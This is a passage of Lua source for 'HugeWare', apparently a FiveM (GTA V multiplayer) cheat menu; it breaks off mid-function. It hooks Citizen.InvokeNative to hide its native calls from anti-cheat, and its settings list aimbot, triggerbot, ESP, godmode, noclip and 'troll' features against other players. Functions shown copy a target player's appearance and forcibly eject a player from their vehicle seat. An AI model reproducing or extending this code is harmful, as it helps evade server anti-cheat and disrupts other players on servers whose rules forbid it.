local Atomic_Invoke_UGDIUGFHKDFSGFD = {
    0x128737EA,
    0x76A9EE1F,
    0x509D5878EB39E842,
    0xAAA34F8A7CB32098,
    0xD49F9B0955C367DE,
    0xAF35D0D2583051B0,
    0x43A66C31C68491C0,
    0x673966A0C0FD7171,
    0x91310870,
    0x7FDD1128,
    "0x128737EA",
    "0x76A9EE1F",
    "0x509D5878EB39E842",
    "0xAAA34F8A7CB32098",
    "0xD49F9B0955C367DE",
    "0xAF35D0D2583051B0",
    "0x43A66C31C68491C0",
    "0x673966A0C0FD7171",
    "0x91310870",
    "0x7FDD1128"
}

local typea = type
local stringlen = string.len
local trigger = TriggerServerEvent
local invokenative = Citizen.InvokeNative
local tostr = tostring

Citizen.InvokeNative = function(invoke, ...)
    local lista = {
        [0x76A9EE1F] = "LoadResourceFile",
        [0x509D5878EB39E842] = "CreateObject",
        [0xAAA34F8A7CB32098] = "ClearPedTasksImmediately",
        [0xD49F9B0955C367DE] = "CreatePed",
        [0xAF35D0D2583051B0] = "CreateVehicle",
        [0x6E31E993] = "GetPlayerPed",
        [0x673966A0C0FD7171] = "CreateAmbientPickup",
        [0x91310870] = "TriggerEventInternal",
        [0x128737EA] = "TriggerLatentServerEventInternal",
        [0xD80958FC74E988A6] = "PlayerPedId"
    }
    if invoke and (invoke == 0x76A9EE1F or lista[invoke]) then
        print("InvokeNative: " .. lista[invoke])
    elseif typea(invoke) ~= "number" then
        print("type: " .. typea(invoke))
    else
        return invokenative(invoke, ...)
    end
end

local InvokeNativeGowno_IDYHGIUSDGSDFG = invokenative

local function Czitirzen_InvokeNative(invoke, ...)
    return InvokeNativeGowno_IDYHGIUSDGSDFG(invoke, ...)
end

local OpenMenuKey = {
    ["Label"] = "DELETE",
    ["Value"] = 178
}

function LoadGif()
    local runtime_txd = CreateRuntimeTxd("hugeware")
    local banner_dui =
        CreateDui(
        "https://cdn.discordapp.com/attachments/730443281720279140/780072110995406858/gifs-on-cli.gif",
        960,
        548
    )
    local b_dui = GetDuiHandle(banner_dui)
    CreateRuntimeTextureFromDuiHandle(runtime_txd, "menu_gif", b_dui)
end

LoadGif()

function DrawLineBox(entity, r, g, b, a)
    if entity then
        local model = GetEntityModel(entity)
        local min, max = GetModelDimensions(model)
        local top_front_right = GetOffsetFromEntityInWorldCoords(entity, max)
        local top_back_right = GetOffsetFromEntityInWorldCoords(entity, vector3(max.x, min.y, max.z))
        local bottom_front_right = GetOffsetFromEntityInWorldCoords(entity, vector3(max.x, max.y, min.z))
        local bottom_back_right = GetOffsetFromEntityInWorldCoords(entity, vector3(max.x, min.y, min.z))
        local top_front_left = GetOffsetFromEntityInWorldCoords(entity, vector3(min.x, max.y, max.z))
        local top_back_left = GetOffsetFromEntityInWorldCoords(entity, vector3(min.x, min.y, max.z))
        local bottom_front_left = GetOffsetFromEntityInWorldCoords(entity, vector3(min.x, max.y, min.z))
        local bottom_back_left = GetOffsetFromEntityInWorldCoords(entity, min)

        DrawLine(top_front_right, top_back_right, r, g, b, a)
        DrawLine(top_front_right, bottom_front_right, r, g, b, a)
        DrawLine(bottom_front_right, bottom_back_right, r, g, b, a)
        DrawLine(top_back_right, bottom_back_right, r, g, b, a)

        DrawLine(top_front_left, top_back_left, r, g, b, a)
        DrawLine(top_back_left, bottom_back_left, r, g, b, a)
        DrawLine(top_front_left, bottom_front_left, r, g, b, a)
        DrawLine(bottom_front_left, bottom_back_left, r, g, b, a)

        DrawLine(top_front_right, top_front_left, r, g, b, a)
        DrawLine(top_back_right, top_back_left, r, g, b, a)
        DrawLine(bottom_front_left, bottom_front_right, r, g, b, a)
        DrawLine(bottom_back_left, bottom_back_right, r, g, b, a)
    end
end

function DrawBoundingBox(entity, r, g, b, a)
    if entity then
        local model = GetEntityModel(entity)
        local min, max = GetModelDimensions(model)
        local top_front_right = GetOffsetFromEntityInWorldCoords(entity, max)
        local top_back_right = GetOffsetFromEntityInWorldCoords(entity, vector3(max.x, min.y, max.z))
        local bottom_front_right = GetOffsetFromEntityInWorldCoords(entity, vector3(max.x, max.y, min.z))
        local bottom_back_right = GetOffsetFromEntityInWorldCoords(entity, vector3(max.x, min.y, min.z))
        local top_front_left = GetOffsetFromEntityInWorldCoords(entity, vector3(min.x, max.y, max.z))
        local top_back_left = GetOffsetFromEntityInWorldCoords(entity, vector3(min.x, min.y, max.z))
        local bottom_front_left = GetOffsetFromEntityInWorldCoords(entity, vector3(min.x, max.y, min.z))
        local bottom_back_left = GetOffsetFromEntityInWorldCoords(entity, min)

        DrawLineBox(entity, r, g, b, a)

        DrawPoly(top_front_left, top_front_right, bottom_front_right, r, g, b, a)
        DrawPoly(bottom_front_right, bottom_front_left, top_front_left, r, g, b, a)

        DrawPoly(top_front_right, top_front_left, top_back_right, r, g, b, a)
        DrawPoly(top_front_left, top_back_left, top_back_right, r, g, b, a)

        DrawPoly(top_back_right, top_back_left, bottom_back_right, r, g, b, a)
        DrawPoly(top_back_left, bottom_back_left, bottom_back_right, r, g, b, a)

        DrawPoly(top_back_left, top_front_left, bottom_front_left, r, g, b, a)
        DrawPoly(bottom_front_left, bottom_back_left, top_back_left, r, g, b, a)

        DrawPoly(top_front_right, top_back_right, bottom_front_right, r, g, b, a)
        DrawPoly(top_back_right, bottom_back_right, bottom_front_right, r, g, b, a)

        DrawPoly(bottom_front_left, bottom_front_right, bottom_back_right, r, g, b, a)
        DrawPoly(bottom_back_right, bottom_back_left, bottom_front_left, r, g, b, a)

        return true
    end

    return false
end

function CheckEntity(entity)
    if IsEntityAPed(entity) or IsEntityAVehicle(entity) or IsEntityAnObject(entity) then
        return true
    end
end

local screen_w, screen_h = GetActiveScreenResolution()

local function DrawText3D_HugeV_UDGUYSDHUGSFFDG(
    x_dhgiuslergssdfg,
    y_d8ygso9hgh9ewdfg,
    z_tdsa8f7gisddfs,
    text_diuigsodgsdfg,
    r_djguisernglse,
    g_IDJGIODSF,
    b_djguisernglse)
    Czitirzen_InvokeNative(0xAA0008F3BBB8F416, x_dhgiuslergssdfg, y_d8ygso9hgh9ewdfg, z_tdsa8f7gisddfs, 0)
    Czitirzen_InvokeNative(0x66E0276CC5F6B9DA, 0)
    Czitirzen_InvokeNative(0x038C1F517D7FDCF8, 0)
    Czitirzen_InvokeNative(0x07C837F9A01C34C9, 0.0, 0.20)
    Czitirzen_InvokeNative(0xBE6B23FFA53FB442, r_djguisernglse, g_IDJGIODSF, b_djguisernglse, 255)
    Czitirzen_InvokeNative(0x465C84BC39F1C351, 0, 0, 0, 0, 255)
    Czitirzen_InvokeNative(0x441603240D202FA6, 2, 0, 0, 0, 150)
    Czitirzen_InvokeNative(0x1CA3E9EAC9D93E5E)
    Czitirzen_InvokeNative(0x2513DFB0FB8400FE)
    Czitirzen_InvokeNative(0x25FBB336DF1804CB, "STRING")
    Czitirzen_InvokeNative(0xC02F4DBFB51D988B, 1)
    Czitirzen_InvokeNative(0x6C188BE134E074AA, text_diuigsodgsdfg)
    Czitirzen_InvokeNative(0xCD015E5BB0D96A57, 0.0, 0.0)
    Czitirzen_InvokeNative(0xFF0B610F6BE0D7AF)
end

local HugeV = {
    string = string,
    type = type,
    menu_color = {
        HugeWare_pw = {
            r = 58,
            g = 57,
            b = 120
        },
        buttons = {
            r = 255,
            g = 255,
            b = 255
        }
    },
    locals = {
        -- Menu Locals --
		PlayerId = -1,
        Displayed = false,
        watermark = true,
        Menu_Display = false,
        MenuEnabled = true,
        selected = "",
        selected2 = "",
        current_tab = "Self",
        -- Combat Locals --

        AllBones = {
            ["HEAD"] = 31086,
            ["NECK"] = 39317,
            ["R FOOT"] = 52301,
            ["L FOOT"] = 14201,
            ["L FOREARM"] = 61163,
            ["R FOREARM"] = 28252,
            ["L UPPER ARM"] = 45509,
            ["R UPPER ARM"] = 40269
        },
        SelectedBones = {
            ["HEAD"] = false,
            ["NECK"] = false,
            ["L FOOT"] = false,
            ["L FOREARM"] = false,
            ["R FOREARM"] = false,
            ["L UPPER ARM"] = false,
            ["R UPPER ARM"] = false
        },
        bunnyhop = false,
        RageBot = false,
        Celownik1 = false,
        Celownik2 = false,
        CrosshairBetter = false,
        force3person = false,
        forceDriveBy = false,
        OneShot = false,
        draw_aimbot_fov = false,
        legit_aimbot = false,
        InfinityAmmo = false,
        TriggerBot = false,
        catgun = false,
        InfiniteCombatRoll = false,
        fov_x = 0.40,
        fov_x2 = 0.60,
        fov_y = 0.40,
        fov_y2 = 0.60,
        -- ESP LOCALS --

        esp_switch = false,
        esp_info = false,
        esp_box = false,
        esp_lines = false,
        esp_skeleton = false,
        -- SELF MENU LOCALS --

        Invisible = false,
        eGun = false,
        Ragdoll = false,
        GodMode = false,
        Noclip = false,
        Noclip2 = false,
        ePunch = false,
        fastrun = false,
        MakeUFlare = false,
        InfiniteStamina = false,
        SuperJump = false,
        NeverWanted = false,
        tinyplayer = false,
        -- ONLINE MENU LOCALS --

        ids = GetActivePlayers(),
        SelectedPlayer = Czitirzen_InvokeNative(
            0x4F8644AF03D0E0D6,
            Citizen.ReturnResultAnyway(),
            Citizen.ResultAsInteger()
        ),
        Spectate = false,
        -- VISUAL LOCALS --

        impacts = {},
        trails_table = {},
        trials = false,
        nofog = false,
        ShowCoords = false,
        DisplayRadar = false,
        shoot_impact = false,
        PlayerBlips = false,
        -- ANTIAIM LOCALS --

        AntiAim = false,
        crouched = false,
        anti_aim_ped = nil,
        -- SETTINGS LOCALS --

        can_walk_with_menu = true,
        console = false,
        background = false,
        UseBackgroundImage = false,
        discordPresence = false,
        rainbow_menu = false,
        -- VEHICLE MENU LOCALS --

        VehGod = false,
        VehBoost = false,
        vehicles = {},
        scrool_vehicles = 11,
        SelectedVehicle = 0,
        CamInVeh = false,
        -- TESTING --

        peds = {},
        -- MISC MENU LOCALS --

        AntiAntiAfk = false,
        walking_antiantiafk = false,
        disable_collisions = false,
        Safemode = true,
        -- FREECAM LOCALS --

        Freecam = false,
        frozen_entities = {},
        tryb = 1,
        modes = {
            "Look Around",
            "Shoot",
            "Create Objects"
        },
        object_freecam = nil,
        freecam_object_heading = nil,
        freecam_object_rotation = 0.0,
        freecam_entity_dragging_heading = nil,
        -- NOTIFICATIONS/CONSOLE LOCALS --

        console_wiadomosci = {},
        notifications = {},
        scrool = 11,
        scrool_console = 15,
        -- Troll Locals --
        DildoRain = false,
        BugPlayer = false,
        -- OTHER LOCALS --

        keys = {
            ["ESC"] = 322,
            ["F1"] = 288,
            ["F2"] = 289,
            ["F3"] = 170,
            ["F5"] = 166,
            ["F6"] = 167,
            ["F7"] = 168,
            ["F8"] = 169,
            ["F9"] = 56,
            ["F10"] = 57,
            ["~"] = 243,
            ["1"] = 157,
            ["2"] = 158,
            ["3"] = 160,
            ["4"] = 164,
            ["5"] = 165,
            ["6"] = 159,
            ["7"] = 161,
            ["8"] = 162,
            ["9"] = 163,
            ["-"] = 84,
            ["="] = 83,
            ["BACKSPACE"] = 177,
            ["TAB"] = 37,
            ["Q"] = 44,
            ["W"] = 32,
            ["E"] = 38,
            ["R"] = 45,
            ["T"] = 245,
            ["Y"] = 246,
            ["U"] = 303,
            ["P"] = 199,
            ["["] = 39,
            ["]"] = 40,
            ["ENTER"] = 18,
            ["CAPS"] = 137,
            ["A"] = 34,
            ["S"] = 8,
            ["D"] = 9,
            ["F"] = 23,
            ["G"] = 47,
            ["H"] = 74,
            ["K"] = 311,
            ["L"] = 182,
            ["LEFTSHIFT"] = 21,
            ["Z"] = 20,
            ["X"] = 73,
            ["C"] = 26,
            ["V"] = 0,
            ["B"] = 29,
            ["N"] = 249,
            ["M"] = 244,
            [","] = 82,
            ["."] = 81,
            ["LEFTCTRL"] = 36,
            ["LEFTALT"] = 19,
            ["SPACE"] = 22,
            ["RIGHTCTRL"] = 70,
            ["HOME"] = 213,
            ["PAGEUP"] = 10,
            ["PAGEDOWN"] = 11,
            ["DELETE"] = 178,
            ["INSERT"] = 121,
            ["LEFT"] = 174,
            ["RIGHT"] = 175,
            ["UP"] = 172,
            ["DOWN"] = 173,
            ["NENTER"] = 201,
            ["MWHEELUP"] = 15,
            ["MWHEELDOWN"] = 14,
            ["LEFTSHIFT/N8"] = 61,
            ["N4"] = 108,
            ["N5"] = 60,
            ["N6"] = 107,
            ["N+"] = 96,
            ["N-"] = 97,
            ["N7"] = 117,
            ["N9"] = 118,
            ["MOUSE1"] = 24,
            ["MOUSE2"] = 25,
            ["MOUSE3"] = 348
        },
        AllGuns = {
            "PISTOL",
            "PISTOL_MK2",
            "COMBATPISTOL",
            "APPISTOL",
            "REVOLVER",
            "REVOLVER_MK2",
            "DOUBLEACTION",
            "PISTOL50",
            "SNSPISTOL",
            "SNSPISTOL_MK2",
            "HEAVYPISTOL",
            "VINTAGEPISTOL",
            "STUNGUN",
            "FLAREGUN",
            "MARKSMANPISTOL",
            "KNIFE",
            "KNUCKLE",
            "NIGHTSTICK",
            "HAMMER",
            "BAT",
            "GOLFCLUB",
            "CROWBAR",
            "BOTTLE",
            "DAGGER",
            "HATCHET",
            "MACHETE",
            "FLASHLIGHT",
            "SWITCHBLADE",
            "POOLCUE",
            "PIPEWRENCH",
            "MICROSMG",
            "MINISMG",
            "SMG",
            "SMG_MK2",
            "ASSAULTSMG",
            "COMBATPDW",
            "GUSENBERG",
            "MACHINEPISTOL",
            "MG",
            "COMBATMG",
            "COMBATMG_MK2",
            "ASSAULTRIFLE",
            "ASSAULTRIFLE_MK2",
            "CARBINERIFLE",
            "CARBINERIFLE_MK2",
            "ADVANCEDRIFLE",
            "SPECIALCARBINE",
            "SPECIALCARBINE_MK2",
            "BULLPUPRIFLE",
            "BULLPUPRIFLE_MK2",
            "COMPACTRIFLE",
            "PUMPSHOTGUN",
            "PUMPSHOTGUN_MK2",
            "SWEEPERSHOTGUN",
            "SAWNOFFSHOTGUN",
            "BULLPUPSHOTGUN",
            "ASSAULTSHOTGUN",
            "MUSKET",
            "HEAVYSHOTGUN",
            "DBSHOTGUN",
            "SNIPERRIFLE",
            "HEAVYSNIPER",
            "HEAVYSNIPER_MK2",
            "MARKSMANRIFLE",
            "MARKSMANRIFLE_MK2",
            "GRENADELAUNCHER",
            "GRENADELAUNCHER_SMOKE",
            "RPG",
            "MINIGUN",
            "FIREWORK",
            "RAILGUN",
            "HOMINGLAUNCHER",
            "COMPACTLAUNCHER",
            "GRENADE",
            "STICKYBOMB",
            "PROXMINE",
            "BZGAS",
            "SMOKEGRENADE",
            "MOLOTOV",
            "FIREEXTINGUISHER",
            "PETROLCAN",
            "SNOWBALL",
            "FLARE",
            "BALL"
        }
    },
    Player = {
        PedId = Czitirzen_InvokeNative(0xD80958FC74E988A6, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()),
        LocalId = Czitirzen_InvokeNative(0x4F8644AF03D0E0D6, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()),
        ServerId = Czitirzen_InvokeNative(
            0x4d97bcc7,
            Czitirzen_InvokeNative(0x4F8644AF03D0E0D6, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()),
            Citizen.ReturnResultAnyway(),
            Citizen.ResultAsInteger()
        )
    },
    functions = {
        getEntityCoords = function(...)
            return Czitirzen_InvokeNative(
                0x3FEF770D40960D5A,
                ...,
                Citizen.ReturnResultAnyway(),
                Citizen.ResultAsVector()
            )
        end,
        isPedInAnyVehicle = function(...)
            return Czitirzen_InvokeNative(0x997ABD671D25CA0B, ..., Citizen.ReturnResultAnyway())
        end
    }
}

local function ClonePed_HugeWare_UDYUIGDFGDF(Target_grejtjtrkyt)
    local ped_htrjkykutkiy = Czitirzen_InvokeNative(0x43A66C31C68491C0, Target_grejtjtrkyt)
    local me_hrejtrGFgre = Czitirzen_InvokeNative(0xD80958FC74E988A6)

    hat_trjtyrjkytkt = Czitirzen_InvokeNative(0x898CC20EA75BACD8, ped_htrjkykutkiy, 0)
    hat_texture_hgrehjrtjt = Czitirzen_InvokeNative(0xE131A28626F81AB2, ped_htrjkykutkiy, 0)

    glasses_htrkytrkyt = Czitirzen_InvokeNative(0x898CC20EA75BACD8, ped_htrjkykutkiy, 1)
    glasses_texture_RJRTJRRTJ = Czitirzen_InvokeNative(0xE131A28626F81AB2, ped_htrjkykutkiy, 1)

    eare_grehrehgregrrt = Czitirzen_InvokeNative(0x898CC20EA75BACD8, ped_htrjkykutkiy, 2)
    ear_texture_HREHRTHJTRJR = Czitirzen_InvokeNative(0xE131A28626F81AB2, ped_htrjkykutkiy, 2)

    watch_hETRTRT = Czitirzen_InvokeNative(0x898CC20EA75BACD8, ped_htrjkykutkiy, 6)
    watch_texture_HRTEJRYJYTJTY = Czitirzen_InvokeNative(0xE131A28626F81AB2, ped_htrjkykutkiy, 6)

    wrist_EHTRHRHJRJY = Czitirzen_InvokeNative(0x898CC20EA75BACD8, ped_htrjkykutkiy, 7)
    wrist_texture_HTRJRJYJTYU = Czitirzen_InvokeNative(0xE131A28626F81AB2, ped_htrjkykutkiy, 7)

    head_drawable_LGLGLKGKGKGKG = Czitirzen_InvokeNative(0x67F3780DD425D4FC, ped_htrjkykutkiy, 0)
    head_palette_JGRTJHJTHJTY = Czitirzen_InvokeNative(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 0)
    head_texture_JGRIEGHJERI = Czitirzen_InvokeNative(0x04A355E041E004E6, ped_htrjkykutkiy, 0)

    beard_drawable_HEHRTJYJYT = Czitirzen_InvokeNative(0x67F3780DD425D4FC, ped_htrjkykutkiy, 1)
    beard_palette = Czitirzen_InvokeNative(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 1)
    beard_texture_HTRJYTJTYJT = Czitirzen_InvokeNative(0x04A355E041E004E6, ped_htrjkykutkiy, 1)

    hair_drawable_HTRJTYKJTUK = Czitirzen_InvokeNative(0x67F3780DD425D4FC, ped_htrjkykutkiy, 2)
    hair_palette_JJJJJJJJ = Czitirzen_InvokeNative(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 2)
    hair_texture_POPOPOPOP = Czitirzen_InvokeNative(0x04A355E041E004E6, ped_htrjkykutkiy, 2)

    torso_drawable_FREJIUGHERU = Czitirzen_InvokeNative(0x67F3780DD425D4FC, ped_htrjkykutkiy, 3)
    torso_palette_GREHTRH = Czitirzen_InvokeNative(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 3)
    torso_texture_GREHTHRTJTY = Czitirzen_InvokeNative(0x04A355E041E004E6, ped_htrjkykutkiy, 3)

    legs_drawable_GERGREHETRHTRH = Czitirzen_InvokeNative(0x67F3780DD425D4FC, ped_htrjkykutkiy, 4)
    legs_palette_gEHTRTRR = Czitirzen_InvokeNative(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 4)
    legs_texture_PLOLKPLOLPPOL = Czitirzen_InvokeNative(0x04A355E041E004E6, ped_htrjkykutkiy, 4)

    hands_drawable_GRTHTRYJYT = Czitirzen_InvokeNative(0x67F3780DD425D4FC, ped_htrjkykutkiy, 5)
    hands_palette_HGRTHRHRTHR = Czitirzen_InvokeNative(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 5)
    hands_texture_HTIKOULUIKUI = Czitirzen_InvokeNative(0x04A355E041E004E6, ped_htrjkykutkiy, 5)

    foot_drawable_HTRYJTYJTYY = Czitirzen_InvokeNative(0x67F3780DD425D4FC, ped_htrjkykutkiy, 6)
    foot_palette_gRTHRRTDTDTER = Czitirzen_InvokeNative(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 6)
    foot_texture_GTHRTHRTHDT = Czitirzen_InvokeNative(0x04A355E041E004E6, ped_htrjkykutkiy, 6)

    acc1_drawable_NTRKJTYKTY = Czitirzen_InvokeNative(0x67F3780DD425D4FC, ped_htrjkykutkiy, 7)
    acc1_palette_HRTYJKTYUKTU = Czitirzen_InvokeNative(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 7)
    acc1_texture_HTEHRTHTFH = Czitirzen_InvokeNative(0x04A355E041E004E6, ped_htrjkykutkiy, 7)

    acc2_drawable_LKPLPOPLPL = Czitirzen_InvokeNative(0x67F3780DD425D4FC, ped_htrjkykutkiy, 8)
    acc2_palette_LOPKJIOJO = Czitirzen_InvokeNative(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 8)
    acc2_texture_GRETRHR = Czitirzen_InvokeNative(0x04A355E041E004E6, ped_htrjkykutkiy, 8)

    acc3_drawable_GREJGHRTBGRH = Czitirzen_InvokeNative(0x67F3780DD425D4FC, ped_htrjkykutkiy, 9)
    acc3_palette_GJRTIHKRTS = Czitirzen_InvokeNative(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 9)
    acc3_texture_GREGRHTHTR = Czitirzen_InvokeNative(0x04A355E041E004E6, ped_htrjkykutkiy, 9)

    mask_drawable_GETHRTEHDR = Czitirzen_InvokeNative(0x67F3780DD425D4FC, ped_htrjkykutkiy, 10)
    mask_palette_hRTHTRHTRYTHT = Czitirzen_InvokeNative(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 10)
    mask_texture_HTHRTHTFDTY = Czitirzen_InvokeNative(0x04A355E041E004E6, ped_htrjkykutkiy, 10)

    aux_drawable_GRTHRTHTDTR = Czitirzen_InvokeNative(0x67F3780DD425D4FC, ped_htrjkykutkiy, 11)
    aux_palette_GRTHRTHTRT = Czitirzen_InvokeNative(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 11)
    aux_texture_HREHESHTR = Czitirzen_InvokeNative(0x04A355E041E004E6, ped_htrjkykutkiy, 11)

    Czitirzen_InvokeNative(0x93376B65A266EB5F, me_hrejtrGFgre, 0, hat_trjtyrjkytkt, hat_texture_hgrehjrtjt, 1)
    Czitirzen_InvokeNative(0x93376B65A266EB5F, me_hrejtrGFgre, 1, glasses_htrkytrkyt, glasses_texture_RJRTJRRTJ, 1)
    Czitirzen_InvokeNative(0x93376B65A266EB5F, me_hrejtrGFgre, 2, eare_grehrehgregrrt, ear_texture_HREHRTHJTRJR, 1)
    Czitirzen_InvokeNative(0x93376B65A266EB5F, me_hrejtrGFgre, 6, watch_hETRTRT, watch_texture_HRTEJRYJYTJTY, 1)
    Czitirzen_InvokeNative(0x93376B65A266EB5F, me_hrejtrGFgre, 7, wrist_EHTRHRHJRJY, wrist_texture_HTRJRJYJTYU, 1)

    Czitirzen_InvokeNative(
        0x262B14F48D29DE80,
        me_hrejtrGFgre,
        0,
        head_drawable_LGLGLKGKGKGKG,
        head_texture_JGRIEGHJERI,
        head_palette_JGRTJHJTHJTY
    )
    Czitirzen_InvokeNative(
        0x262B14F48D29DE80,
        me_hrejtrGFgre,
        1,
        beard_drawable_HEHRTJYJYT,
        beard_texture_HTRJYTJTYJT,
        beard_palette
    )
    Czitirzen_InvokeNative(
        0x262B14F48D29DE80,
        me_hrejtrGFgre,
        2,
        hair_drawable_HTRJTYKJTUK,
        hair_texture_POPOPOPOP,
        hair_palette_JJJJJJJJ
    )
    Czitirzen_InvokeNative(
        0x262B14F48D29DE80,
        me_hrejtrGFgre,
        3,
        torso_drawable_FREJIUGHERU,
        torso_texture_GREHTHRTJTY,
        torso_palette_GREHTRH
    )
    Czitirzen_InvokeNative(
        0x262B14F48D29DE80,
        me_hrejtrGFgre,
        4,
        legs_drawable_GERGREHETRHTRH,
        legs_texture_PLOLKPLOLPPOL,
        legs_palette_gEHTRTRR
    )
    Czitirzen_InvokeNative(
        0x262B14F48D29DE80,
        me_hrejtrGFgre,
        5,
        hands_drawable_GRTHTRYJYT,
        hands_texture_HTIKOULUIKUI,
        hands_palette_HGRTHRHRTHR
    )
    Czitirzen_InvokeNative(
        0x262B14F48D29DE80,
        me_hrejtrGFgre,
        6,
        foot_drawable_HTRYJTYJTYY,
        foot_texture_GTHRTHRTHDT,
        foot_palette_gRTHRRTDTDTER
    )
    Czitirzen_InvokeNative(
        0x262B14F48D29DE80,
        me_hrejtrGFgre,
        7,
        acc1_drawable_NTRKJTYKTY,
        acc1_texture_HTEHRTHTFH,
        acc1_palette_HRTYJKTYUKTU
    )
    Czitirzen_InvokeNative(
        0x262B14F48D29DE80,
        me_hrejtrGFgre,
        8,
        acc2_drawable_LKPLPOPLPL,
        acc2_texture_GRETRHR,
        acc2_palette_LOPKJIOJO
    )
    Czitirzen_InvokeNative(
        0x262B14F48D29DE80,
        me_hrejtrGFgre,
        9,
        acc3_drawable_GREJGHRTBGRH,
        acc3_texture_GREGRHTHTR,
        acc3_palette_GJRTIHKRTS
    )
    Czitirzen_InvokeNative(
        0x262B14F48D29DE80,
        me_hrejtrGFgre,
        10,
        mask_drawable_GETHRTEHDR,
        mask_texture_HTHRTHTFDTY,
        mask_palette_hRTHTRHTRYTHT
    )
    Czitirzen_InvokeNative(
        0x262B14F48D29DE80,
        me_hrejtrGFgre,
        11,
        aux_drawable_GRTHRTHTDTR,
        aux_texture_HREHESHTR,
        aux_palette_GRTHRTHTRT
    )
end

--

local function AddCustomization_HugeV_DSIUHGIUDSGSD(HASH_IDSUGIDSHISDGSD)
    return Czitirzen_InvokeNative(
        0xD966D51AA5B28BB9,
        Czitirzen_InvokeNative(0xD80958FC74E988A6),
        GetSelectedPedWeapon(Czitirzen_InvokeNative(0xD80958FC74E988A6)),
        HASH_IDSUGIDSHISDGSD
    )
end

local function RemoveCustomization_HugeV_DSIUHGIUDSGSD(HASH_IDSUGIDSHISDGSD)
    return Czitirzen_InvokeNative(
        0x1E8BE90C74FB4C09,
        Czitirzen_InvokeNative(0xD80958FC74E988A6),
        GetSelectedPedWeapon(Czitirzen_InvokeNative(0xD80958FC74E988A6)),
        HASH_IDSUGIDSHISDGSD
    )
end

local function DebugPrint(to_print, type_dsg)
    if type_dsg == "INFO" then
        table.insert(HugeV.locals.console_wiadomosci, "[~b~HUGEWARE~s~] " .. to_print)
    elseif type_dsg == "ERROR" then
        table.insert(HugeV.locals.console_wiadomosci, "[~r~HUGEWARE~s~] " .. to_print)
    elseif type_dsg == "SUCCES" then
        table.insert(HugeV.locals.console_wiadomosci, "[~g~HUGEWARE~s~] " .. to_print)
    else
        table.insert(HugeV.locals.console_wiadomosci, "[~c~HUGEWARE~s~] " .. to_print)
    end
end

local function QuickReplacement_HugeWare_UDHUKGDFHKDFGDF(player_diuhfsiddfsg)
    Citizen.CreateThread(
        function()
            local ped_udfyugsyfdsg = Czitirzen_InvokeNative(0x43A66C31C68491C0, player_diuhfsiddfsg)
            local vehicle_UDHUHDFSGDFG = GetVehiclePedIsIn(ped_udfyugsyfdsg, 0)
            local free_seat_IDYGIUFGDFG = false
            if vehicle_UDHUHDFSGDFG ~= 0 then
                if GetPedInVehicleSeat(vehicle_UDHUHDFSGDFG, -1) ~= 0 then
                    Czitirzen_InvokeNative(0xAAA34F8A7CB32098, ped_udfyugsyfdsg)
                    Citizen.Wait(10)
                    while not free_seat_IDYGIUFGDFG do
                        Czitirzen_InvokeNative(0xAAA34F8A7CB32098, ped_udfyugsyfdsg)
                        if IsVehicleSeatFree(vehicle_UDHUHDFSGDFG, -1) then
                            free_seat_IDYGIUFGDFG = true
                            ClonePed_HugeWare_UDYUIGDFGDF(HugeV.locals.SelectedPlayer)
                            Czitirzen_InvokeNative(
                                0xF75B0D629E1C063D,
                                Czitirzen_InvokeNative(0xD80958FC74E988A6),
                                vehicle_UDHUHDFSGDFG,
                                -1
                            )
                            break
                        else
                            Citizen.Wait(0)
                        end
                    end
                elseif GetPedInVehicleSeat(vehicle_UDHUHDFSGDFG, 0) ~= 0 then
                    Czitirzen_InvokeNative(0xAAA34F8A7CB32098, ped_udfyugsyfdsg)
                    Citizen.Wait(10)
                    while not free_seat_IDYGIUFGDFG do
                        Czitirzen_InvokeNative(0xAAA34F8A7CB32098, ped_udfyugsyfdsg)
                        if IsVehicleSeatFree(vehicle_UDHUHDFSGDFG, 0) then
                            free_seat_IDYGIUFGDFG = true
                            ClonePed_HugeWare_UDYUIGDFGDF(HugeV.locals.SelectedPlayer)
                            Czitirzen_InvokeNative(
                                0xF75B0D629E1C063D,
                                Czitirzen_InvokeNative(0xD80958FC74E988A6),
                                vehicle_UDHUHDFSGDFG,
                                0
                            )
                            break
                        else
                            Citizen.Wait(0)
                        end
                    end
                elseif GetPedInVehicleSeat(vehicle_UDHUHDFSGDFG, 1) ~= 0 then
                    Czitirzen_InvokeNative(0xAAA34F8A7CB32098, ped_udfyugsyfdsg)
                    Citizen.Wait(10)
                    while not free_seat_IDYGIUFGDFG do
                        Czitirzen_InvokeNative(0xAAA34F8A7CB32098, ped_udfyugsyfdsg)
                        if IsVehicleSeatFree(vehicle_UDHUHDFSGDFG, 1) then
                            free_seat_IDYGIUFGDFG = true
                            ClonePed_HugeWare_UDYUIGDFGDF(HugeV.locals.SelectedPlayer)
                            Czitirzen_InvokeNative(
                                0xF75B0D629E1C063D,
                                Czitirzen_InvokeNative(0xD80958FC74E988A6),
                                vehicle_UDHUHDFSGDFG,
                                1
                            )
                            break
                        else
                            Citizen.Wait(0)
                        end
                    end
                elseif GetPedInVehicleSeat(vehicle_UDHUHDFSGDFG, 2) ~= 0 then
                    Czitirzen_InvokeNative(0xAAA34F8A7CB32098, ped_udfyugsyfdsg)
                    Wait(10)
                    while not free_seat_IDYGIUFGDFG do
                        Czitirzen_InvokeNative(0xAAA34F8A7CB32098, ped_udfyugsyfdsg)
                        if IsVehicleSeatFree(vehicle_UDHUHDFSGDFG, 2) then
                            free_seat_IDYGIUFGDFG = true
                            ClonePed_HugeWare_UDYUIGDFGDF(HugeV.locals.SelectedPlayer)
                            Czitirzen_InvokeNative(
                                0xF75B0D629E1C063D,
                                Czitirzen_InvokeNative(0xD80958FC74E988A6),
                                vehicle_UDHUHDFSGDFG,
                                2
                            )
                            break
                        else
                            Wait(0)
                        end
                    end
                else
                    free_seat_IDYGIUFGDFG = true
                    Czitirzen_InvokeNative(
